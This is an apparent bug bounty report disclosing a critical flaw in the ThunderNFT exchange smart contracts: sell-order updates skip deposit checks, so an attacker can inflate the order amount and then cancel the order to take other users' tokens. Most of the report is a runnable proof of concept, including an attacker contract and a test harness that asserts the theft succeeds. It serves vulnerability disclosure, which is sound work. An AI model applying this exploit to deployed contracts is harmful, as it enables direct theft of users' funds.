# IOP \_ ThunderNFT 34629 - \[Smart Contract - Critical] Theft of Deposited Funds

## Theft of Deposited Funds

Submitted on Sun Aug 18 2024 18:33:15 GMT-0400 (Atlantic Standard Time) by @Blockian for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34629

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/thunder\\_exchange>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties

### Description

## Thunder Exchange

### Theft of Deposited Funds

#### Description

A critical vulnerability exists that enables a malicious actor to steal all deposited non-unique tokens (e.g., tokens following the `ERC1155` standard) listed for sale.

### Root Cause

As discussed in our Discord exchange, the `Order.amount` field was introduced to accommodate ERC1155-style tokens:

> Hi! Yes, amount is added in case of Erc1155 style token standard

However, when updating a sell order, there is no validation to ensure that the order maker has deposited the required additional tokens into the exchange.

In the code snippet below, you can see that the `update_order` function does not check if additional tokens have been deposited when modifying an existing order:

```rs
    fn update_order(order_input: MakerOrderInput) {
        // ...
        match order.side {
            // ...
            Side::Sell => {},
        }
        // ...
    }
```

This omission allows an attacker to modify the `amount` variable in the order without actually depositing the corresponding tokens.

For comparison, the `place_order` function does perform this validation:

```rs
    fn place_order(order_input: MakerOrderInput) {
        // ...
        match order.side {
            Side::Sell => {
                require(msg_asset_id() == AssetId::new(order.collection, order.token_id), ThunderExchangeErrors::AssetIdNotMatched);
                require(msg_amount() == order_input.amount, ThunderExchangeErrors::AmountNotMatched);
            },
            // ...
        }
        // ...
    }
```

### Impact

This vulnerability permits an attacker to artificially increase the `amount` in an order, and subsequently invoke the `cancel_order` function.

As a result, the exchange sends the inflated number of tokens to the attacker, effectively enabling theft from legitimate users.

### Proposed fix

To mitigate this issue, it is recommended to enforce the following during an order update:

1. Increase in Amount: Require the user to deposit additional tokens if the `amount` is increased.
2. Decrease in Amount: Refund the corresponding tokens to the user if the `amount` is decreased.

### Proof of concept

## Proof of Concept

Due to the relatively new nature of the Sway language and the limited availability of reliable testing tools, the proof of concept (PoC) is complex.

Below is a pseudo-PoC followed by a detailed actual PoC.

### Pseudo POC

1. An innocent user creates a Sell Order for some Asset
2. The malicious actor creates a Sell Order for the same Asset
3. The malicious actor updates the Sell Order amount to include the innocent user's deposit (for example, innocent user deposited `X` tokens, the malicious actor deposited `Y` tokens, the malicious actor updates the Sell Order to be `X + Y`)
4. The malicious actor cancels their Sell Order

```rs
        // innocent user
        exchange.place_order{ asset_id: AssetId::new(order.collection, order.token_id).bits(), coins: order.amount }(order);

        // attacker
        exchange.place_order{ asset_id: AssetId::new(order.collection, order.token_id).bits(), coins: 1 }(order);
        exchange.update_order(order);
        exchange.cancel_order(order.strategy, order.nonce, order.side);
```

### Actual POC

There are some steps to follow:

To create an actual PoC, some modifications to the protocol are necessary.

1. The protocol currently only allows addresses to interact, which is generally fine. However, when transferring coins in the Fuel ecosystem, a Variable Output needs to be added to the transaction — this isn't supported by the current Sway testing tools.
2. Since this vulnerability is unrelated to the nature of who interacts with the protocol, adjustments will be made to allow contracts to interact, enabling the PoC. These changes are strictly for testing purposes and do not affect the core issue.

#### Changes to the protocol for the POC

* Add the following changes to the `thunder_exchange` contract:

```rs
// line 141 change from:
        let caller = get_msg_sender_address_or_panic();
// change to
        let caller = Address::from(get_msg_sender_contract_or_panic().bits()); // changed for POC
/* ------------------------------------------------------------------------------------------------------ */
// line 162 change from:
        Identity::Address(unwrapped_order.maker),
// change to
        Identity::ContractId(ContractId::from(unwrapped_order.maker.bits())), // changed for POC
/* ------------------------------------------------------------------------------------------------------ */
// line 324 change from:
        require(input.maker == get_msg_sender_address_or_panic(), ThunderExchangeErrors::CallerMustBeMaker);
// change to
        require(input.maker == Address::from(get_msg_sender_contract_or_panic().bits()), ThunderExchangeErrors::CallerMustBeMaker);  // changed for POC
/* ------------------------------------------------------------------------------------------------------ */
// line 352 change from:
        require(taker_order.taker == get_msg_sender_address_or_panic(), ThunderExchangeErrors::CallerMustBeMaker);
// change to
        require(taker_order.taker == Address::from(get_msg_sender_contract_or_panic().bits()), ThunderExchangeErrors::CallerMustBeMaker); // changed for POC
/* ------------------------------------------------------------------------------------------------------ */
// line 388 change from:
        Identity::Address(order.taker),
// change to
        Identity::ContractId(ContractId::from(order.taker.bits())),  // changed for POC
/* ------------------------------------------------------------------------------------------------------ */
// line 408 change from:
        Identity::Address(order.maker),
// change to
        Identity::ContractId(ContractId::from(order.maker.bits())),  // changed for POC
/* ------------------------------------------------------------------------------------------------------ */
// line 454 change from:
        transfer(Identity::Address(to), payment_asset, final_seller_amount);
// change to
        transfer(Identity::ContractId(ContractId::from(to.bits())), payment_asset, final_seller_amount);  // changed for POC
/* ------------------------------------------------------------------------------------------------------ */
// line 474 change from:
        Identity::Address(from),
// change to
        Identity::ContractId(ContractId::from(from.bits())),  // changed for POC
/* ------------------------------------------------------------------------------------------------------ */
// line 508 change from:
        transfer(Identity::Address(to), payment_asset, final_seller_amount);
// change to
        transfer(Identity::ContractId(ContractId::from(to.bits())), payment_asset, final_seller_amount);  // changed for POC
/* ------------------------------------------------------------------------------------------------------ */
// line 521 change from:
        pool.balance_of(Identity::Address(account), asset)
// change to
        pool.balance_of(Identity::ContractId(ContractId::from(account.bits())), asset)  // changed for POC
```

In addition, To make an `MakerOrderInput` Struct, we need to make the `ExtraParams` Struct public, so in the `order_types.sw` file, lets add a `pub` in line 37.

#### The tests files.

* Create `forc.toml` in `contracts-v1` and add the below in the `forc.toml`:

```rs
[workspace]
members = ["tests", "asset_manager", "erc721", "execution_manager", "execution_strategies/strategy_fixed_price_sale" ,"libraries", "interfaces" , "pool", "royalty_manager", "thunder_exchange", "test_asset", "test_user", "test_attacker"]
```

* Create 4 new folder called `tests`, `test_user`, `test_attacker`, and `test_asset` under the `contracts-v1` directory:
* In the each folder create a folder named `src` with a file called `main.sw`, and a `forc.toml` file. The folder tree will look like this:

```bash
contracts-v1
├── test_asset
│   ├── forc.toml
│   └── src
│       └── main.sw
├── test_attacker
│   ├── forc.toml
│   └── src
│       └── main.sw
├── test_user
│   ├── forc.toml
│   └── src
│       └── main.sw
├── tests
│   ├── forc.toml
│   └── src
│       └── main.sw
```

#### tests folder

In the `tests` folder.

* Add the below in the `forc.toml`:

```rs
[project]
authors = ["Blockian"]
entry = "main.sw"
license = "Apache-2.0"
name = "test_contract"

[dependencies]
standards = { git = "https://github.com/FuelLabs/sway-standards", tag = "v0.4.4" }
interfaces = { path = "../interfaces" }
libraries = { path = "../libraries" }


[contract-dependencies]

asset_manager = { path = "../asset_manager" }

thunder_exchange = { path = "../thunder_exchange" }

pool = { path = "../pool" }

execution_manager = { path = "../execution_manager" }

royalty_manager = { path = "../royalty_manager" }

strategy_fixed_price_sale = {path = "../execution_strategies/strategy_fixed_price_sale"}

test_asset = { path = "../test_asset" }

test_user = { path = "../test_user" }
test_attacker = { path = "../test_attacker" }
```

* Add the below in the `main.sw`:

```rs
contract;

use interfaces::{
  thunder_exchange_interface::{ThunderExchange},
  royalty_manager_interface::*,
  asset_manager_interface::*,
  execution_manager_interface::ExecutionManager,
  execution_strategy_interface::*,
  test_attacker_interface::*,
  test_user_interface::*,
  pool_interface::Pool,
};

use libraries::{
  msg_sender_address::*,
  constants::*,
  order_types::*,
  ownable::*,
};

use standards::{src3::SRC3};

use std::{
  block::timestamp,
  auth::*,
  call_frames::*,
  context::*,
  contract_id::ContractId,
  constants::DEFAULT_SUB_ID,
  logging::log,
  revert::require,
  assert::*,
  storage::storage_map::*,
  asset::*
};

fn initialize_functions() {
  //initialize all contracts 

  let thunder_exch = abi(ThunderExchange, thunder_exchange::CONTRACT_ID);
  thunder_exch.initialize();

  let asset_mngr = abi(AssetManager, asset_manager::CONTRACT_ID);
  asset_mngr.initialize();

  let execution_manager = abi(ExecutionManager, execution_manager::CONTRACT_ID);
  execution_manager.initialize();

  let royalty_manager = abi(RoyaltyManager, royalty_manager::CONTRACT_ID);
  royalty_manager.initialize();

  // required for initialize below contracts
  let exchange_contract_id = ContractId::from(thunder_exchange::CONTRACT_ID);
  let asset_manger_contract_id = ContractId::from(asset_manager::CONTRACT_ID);
  let pool_contract_id = ContractId::from(pool::CONTRACT_ID);
  let strategy_contract_id = ContractId::from(strategy_fixed_price_sale::CONTRACT_ID);

  let fixed_strategy = abi(ExecutionStrategy, strategy_fixed_price_sale::CONTRACT_ID);
  fixed_strategy.initialize(exchange_contract_id);

  let pool = abi(Pool, pool::CONTRACT_ID);
  pool.initialize(exchange_contract_id, asset_manger_contract_id);

  // initialize user and attacker
  let user = abi(TestUser, test_user::CONTRACT_ID);
  user.initialize(exchange_contract_id, pool_contract_id, strategy_contract_id);

  let attacker = abi(TestAttacker, test_attacker::CONTRACT_ID);
  attacker.initialize(exchange_contract_id, pool_contract_id, strategy_contract_id);

  thunder_exch.set_pool(pool_contract_id);
  thunder_exch.set_execution_manager(ContractId::from(execution_manager::CONTRACT_ID));
  thunder_exch.set_royalty_manager(ContractId::from(royalty_manager::CONTRACT_ID));
  thunder_exch.set_asset_manager(asset_manger_contract_id);
}


fn setup_exchange() {
  let example_asset = abi(SRC3, test_asset::CONTRACT_ID);
  let asset_mngr = abi(AssetManager, asset_manager::CONTRACT_ID);
  let execution_manager = abi(ExecutionManager, execution_manager::CONTRACT_ID);

  let asset_id = AssetId::new(ContractId::from(test_asset::CONTRACT_ID), DEFAULT_SUB_ID);

  asset_mngr.add_asset(asset_id);
  execution_manager.add_strategy(ContractId::from(strategy_fixed_price_sale::CONTRACT_ID));

  // fund users of the protocol
  example_asset.mint(Identity::ContractId(ContractId::from(test_attacker::CONTRACT_ID)), DEFAULT_SUB_ID, 1000);
  example_asset.mint(Identity::ContractId(ContractId::from(test_user::CONTRACT_ID)), DEFAULT_SUB_ID, 1000);

  // fund users of the protocol
  let SUB_ERC_1155_ID: SubId = 0x0000000000000000000000000000000000000000000000000000000000000001;
  example_asset.mint(Identity::ContractId(ContractId::from(test_attacker::CONTRACT_ID)), SUB_ERC_1155_ID, 1000);
  example_asset.mint(Identity::ContractId(ContractId::from(test_user::CONTRACT_ID)), SUB_ERC_1155_ID, 1000);
}

fn call_attack() {
  let SUB_ERC_1155_ID: SubId = 0x0000000000000000000000000000000000000000000000000000000000000001;

  let user = abi(TestUser, test_user::CONTRACT_ID);
  let attacker = abi(TestAttacker, test_attacker::CONTRACT_ID);

  let asset_id = AssetId::new(ContractId::from(test_asset::CONTRACT_ID), DEFAULT_SUB_ID);
  let strategy = ContractId::from(strategy_fixed_price_sale::CONTRACT_ID);

  let params = ExtraParams {
    extra_address_param: ZERO_ADDRESS,
    extra_contract_param: ZERO_CONTRACT_ID,
    extra_u64_param: 0,
  };

  let order = MakerOrderInput {
    side: Side::Sell,
    maker: Address::from(test_user::CONTRACT_ID),
    collection: ContractId::from(test_asset::CONTRACT_ID),
    token_id: SUB_ERC_1155_ID,
    price: 500,
    amount: 100,
    nonce: 1,
    strategy: strategy,
    payment_asset: asset_id,
    expiration_range: 1000,
    extra_params: params,
  };

  // user places ordinary sell order
  user.place_sell_order(order);


  let order = MakerOrderInput {
    side: Side::Sell,
    maker: Address::from(test_attacker::CONTRACT_ID),
    collection: ContractId::from(test_asset::CONTRACT_ID),
    token_id: SUB_ERC_1155_ID,
    price: 500,
    amount: 1,
    nonce: 1,
    strategy: strategy,
    payment_asset: asset_id,
    expiration_range: 1000,
    extra_params: params,
  };

  // attacker steal the user's tokens.
  attacker.execute_attack(order, 101);

  assert(balance_of(ContractId::from(test_attacker::CONTRACT_ID), AssetId::new(order.collection, order.token_id)) == (1000 + 100)); // 1000 originaly minted, 100 stolen
}

#[test()]
fn test_attack() {
  initialize_functions();
  setup_exchange();

  // attack part
  call_attack();
}
```

#### test\_user folder

In the `test_user` folder.

* Add the below in the `forc.toml`:

```rs
[project]
authors = ["Blockian"]
entry = "main.sw"
license = "Apache-2.0"
name = "test_user"

[dependencies]
interfaces = { path = "../interfaces" }
libraries = { path = "../libraries" }
standards = { git = "https://github.com/FuelLabs/sway-standards", tag = "v0.4.4" }
```

* Add the below in the `main.sw`:

```rs
contract;

use std::{
    address::Address,
    auth::*,
    call_frames::*,
    constants::*,
    context::*,
    contract_id::ContractId,
    hash::Hash,
    logging::log,
    identity::Identity,
    revert::*,
    asset::*,
    storage::storage_map::*,
};

use interfaces::{
    asset_manager_interface::*,
    pool_interface::*,
    test_user_interface::*,
    thunder_exchange_interface::{ThunderExchange},
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
};

storage {
    /// Thunder Exchange contractId
    exchange: Option<ContractId> = Option::None,

    /// Pool contractId
    pool: Option<ContractId> = Option::None,

    /// Strategy contractId
    strategy: Option<ContractId> = Option::None,
}

impl TestUser for Contract {
    #[storage(read, write)]
    fn initialize(exchange: ContractId, pool: ContractId, strategy: ContractId) {
        storage.exchange.write(Option::Some(exchange));
        storage.pool.write(Option::Some(pool));
        storage.strategy.write(Option::Some(strategy));
    }

    #[storage(read)]
    fn place_buy_order(asset: AssetId, amount: u64, order: MakerOrderInput) {
        // let strategy = storage.strategy.read().unwrap();
        let exchange_addr = storage.exchange.read().unwrap().bits();
        let exchange = abi(ThunderExchange, exchange_addr);
        let pool_addr = storage.pool.read().unwrap().bits();
        let pool = abi(Pool, pool_addr);

        // deposit to pool and create order
        pool.deposit{ asset_id: asset.bits(), coins: amount }();
        exchange.place_order(order);
        // pool.withdraw(asset, amount);
    }

    #[storage(read)]
    fn place_sell_order(order: MakerOrderInput) {
        let exchange_addr = storage.exchange.read().unwrap().bits();
        let exchange = abi(ThunderExchange, exchange_addr);

        exchange.place_order{ asset_id: AssetId::new(order.collection, order.token_id).bits(), coins: order.amount }(order); // user places an innocent order
    }
}
```

#### test\_attacker folder

In the `test_attacker` folder.

* Add the below in the `forc.toml`:

```rs
[project]
authors = ["Blockian"]
entry = "main.sw"
license = "Apache-2.0"
name = "test_attacker"

[dependencies]
interfaces = { path = "../interfaces" }
libraries = { path = "../libraries" }
standards = { git = "https://github.com/FuelLabs/sway-standards", tag = "v0.4.4" }
```

* Add the below in the `main.sw`:

```rs
contract;

use std::{
    address::Address,
    auth::*,
    call_frames::*,
    constants::*,
    context::*,
    contract_id::ContractId,
    hash::Hash,
    logging::log,
    identity::Identity,
    revert::*,
    asset::*,
    storage::storage_map::*,
};

use interfaces::{
    asset_manager_interface::*,
    pool_interface::*,
    test_attacker_interface::*,
    thunder_exchange_interface::{ThunderExchange},
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
};

storage {
    /// Thunder Exchange contractId
    exchange: Option<ContractId> = Option::None,

    /// Pool contractId
    pool: Option<ContractId> = Option::None,

    /// Strategy contractId
    strategy: Option<ContractId> = Option::None,
}

impl TestAttacker for Contract {
    #[storage(read, write)]
    fn initialize(exchange: ContractId, pool: ContractId, strategy: ContractId) {
        storage.exchange.write(Option::Some(exchange));
        storage.pool.write(Option::Some(pool));
        storage.strategy.write(Option::Some(strategy));
    }

    #[storage(read)]
    fn execute_attack(order: MakerOrderInput, amount_to_seal: u64) {
        let exchange_addr = storage.exchange.read().unwrap().bits();
        let exchange = abi(ThunderExchange, exchange_addr);

        exchange.place_order{ asset_id: AssetId::new(order.collection, order.token_id).bits(), coins: order.amount }(order);

        let new_order = MakerOrderInput {
            side: order.side,
            maker: order.maker,
            collection: order.collection,
            token_id: order.token_id,
            price: order.price,
            amount: amount_to_seal, // amount_to_seal - 1 will be the amount stolen :)
            nonce: order.nonce,
            strategy: order.strategy,
            payment_asset: order.payment_asset,
            expiration_range: order.expiration_range,
            extra_params: order.extra_params,
        };

        exchange.update_order(new_order);
        exchange.cancel_order(order.strategy, order.nonce, order.side);
    }
}
```

#### test\_asset folder

In the `test_asset` folder. The test asset is simply the Fuel Team SRC3 [example](https://github.com/FuelLabs/sway-standards/blob/master/examples/src3-mint-burn/multi_asset/src/multi_asset.sw)

* Add the below in the `forc.toml`:

```rs
[project]
authors = ["Blockian"]
entry = "main.sw"
license = "Apache-2.0"
name = "test_asset"

[dependencies]
standards = { git = "https://github.com/FuelLabs/sway-standards", tag = "v0.4.4" }
```

* Add the below in the `main.sw`:

````rs
contract;

use standards::{src20::SRC20, src3::SRC3};
use std::{
    asset::{
        burn,
        mint_to,
    },
    call_frames::msg_asset_id,
    context::msg_amount,
    hash::Hash,
    storage::storage_string::*,
    string::String,
};

// In this example, all assets minted from this contract have the same decimals, name, and symbol
configurable {
    /// The decimals of every asset minted by this contract.
    DECIMALS: u8 = 9u8,
    /// The name of every asset minted by this contract.
    NAME: str[12] = __to_str_array("ExampleAsset"),
    /// The symbol of every asset minted by this contract.
    SYMBOL: str[2] = __to_str_array("EA"),
}

storage {
    /// The total number of distinguishable assets this contract has minted.
    total_assets: u64 = 0,
    /// The total supply of a particular asset.
    total_supply: StorageMap<AssetId, u64> = StorageMap {},
}

impl SRC3 for Contract {
    /// Unconditionally mints new assets using the `sub_id` sub-identifier.
    ///
    /// # Arguments
    ///
    /// * `recipient`: [Identity] - The user to which the newly minted asset is transferred to.
    /// * `sub_id`: [SubId] - The sub-identifier of the newly minted asset.
    /// * `amount`: [u64] - The quantity of coins to mint.
    ///
    /// # Number of Storage Accesses
    ///
    /// * Reads: `2`
    /// * Writes: `2`
    ///
    /// # Examples
    ///
    /// ```sway
    /// use src3::SRC3;
    /// use std::constants::DEFAULT_SUB_ID;
    ///
    /// fn foo(contract_id: ContractId) {
    ///     let contract_abi = abi(SRC3, contract_id);
    ///     contract_abi.mint(Identity::ContractId(contract_id), DEFAULT_SUB_ID, 100);
    /// }
    /// ```
    #[storage(read, write)]
    fn mint(recipient: Identity, sub_id: SubId, amount: u64) {
        let asset_id = AssetId::new(ContractId::this(), sub_id);

        // If this SubId is new, increment the total number of distinguishable assets this contract has minted.
        let asset_supply = storage.total_supply.get(asset_id).try_read();
        match asset_supply {
            None => {
                storage.total_assets.write(storage.total_assets.read() + 1)
            },
            _ => {},
        }

        // Increment total supply of the asset and mint to the recipient.
        storage
            .total_supply
            .insert(asset_id, amount + asset_supply.unwrap_or(0));
        mint_to(recipient, sub_id, amount);
    }

    /// Unconditionally burns assets sent with the `sub_id` sub-identifier.
    ///
    /// # Arguments
    ///
    /// * `sub_id`: [SubId] - The sub-identifier of the asset to burn.
    /// * `amount`: [u64] - The quantity of coins to burn.
    ///
    /// # Number of Storage Accesses
    ///
    /// * Reads: `1`
    /// * Writes: `1`
    ///
    /// # Reverts
    ///
    /// * When the transaction did not include at least `amount` coins.
    /// * When the asset included in the transaction does not have the SubId `sub_id`.
    ///
    /// # Examples
    ///
    /// ```sway
    /// use src3::SRC3;
    /// use std::constants::DEFAULT_SUB_ID;
    ///
    /// fn foo(contract_id: ContractId, asset_id: AssetId) {
    ///     let contract_abi = abi(SRC3, contract_id);
    ///     contract_abi {
    ///         gas: 10000,
    ///         coins: 100,
    ///         asset_id: asset_id,
    ///     }.burn(DEFAULT_SUB_ID, 100);
    /// }
    /// ```
    #[payable]
    #[storage(read, write)]
    fn burn(sub_id: SubId, amount: u64) {
        let asset_id = AssetId::new(ContractId::this(), sub_id);
        require(msg_amount() == amount, "Incorrect amount provided");
        require(msg_asset_id() == asset_id, "Incorrect asset provided");

        // Decrement total supply of the asset and burn.
        storage
            .total_supply
            .insert(asset_id, storage.total_supply.get(asset_id).read() - amount);
        burn(sub_id, amount);
    }
}

// SRC3 extends SRC20, so this must be included
impl SRC20 for Contract {
    #[storage(read)]
    fn total_assets() -> u64 {
        storage.total_assets.read()
    }

    #[storage(read)]
    fn total_supply(asset: AssetId) -> Option<u64> {
        storage.total_supply.get(asset).try_read()
    }

    #[storage(read)]
    fn name(asset: AssetId) -> Option<String> {
        match storage.total_supply.get(asset).try_read() {
            Some(_) => Some(String::from_ascii_str(from_str_array(NAME))),
            None => None,
        }
    }

    #[storage(read)]
    fn symbol(asset: AssetId) -> Option<String> {
        match storage.total_supply.get(asset).try_read() {
            Some(_) => Some(String::from_ascii_str(from_str_array(SYMBOL))),
            None => None,
        }
    }

    #[storage(read)]
    fn decimals(asset: AssetId) -> Option<u8> {
        match storage.total_supply.get(asset).try_read() {
            Some(_) => Some(DECIMALS),
            None => None,
        }
    }
}
````

#### Interfaces

Now we need to add the `test_user` and `test_attacker` interfaces to interact with. In the `interfaces/src` folder, in the `lib.sw` add the following lines:

```rs
pub mod test_user_interface;
pub mod test_attacker_interface;
```

Additionally, create a file called `test_user_interface.sw` in the `interfaces/src` folder and add the following:

```rs
library;

use libraries::{
    order_types::*,
};

abi TestUser {
    #[storage(read, write)]
    fn initialize(exchange: ContractId, pool: ContractId, strategy: ContractId);

    #[storage(read)]
    fn place_buy_order(asset: AssetId, amount: u64, order: MakerOrderInput);

    #[storage(read)]
    fn place_sell_order(order: MakerOrderInput);
}

```

Create a file called `test_attacker_interface.sw` in the `interfaces/src` folder and add the following:

```rs
library;

use libraries::{
    order_types::*,
};

abi TestAttacker {
    #[storage(read, write)]
    fn initialize(exchange: ContractId, pool: ContractId, strategy: ContractId);

    #[storage(read)]
    fn execute_attack(order: MakerOrderInput, amount_to_seal: u64);
}

```

#### Run it all!

Simply run `forc test` in `smart-contracts/contracts-v1`.

### POC TL;DR

1. Initializing the project contracts
2. Minting some coins to the `test_user` and `test_attacker`
3. Test User creates an innocent Sell Order
4. Test Attacker steals Test User's deposited tokens
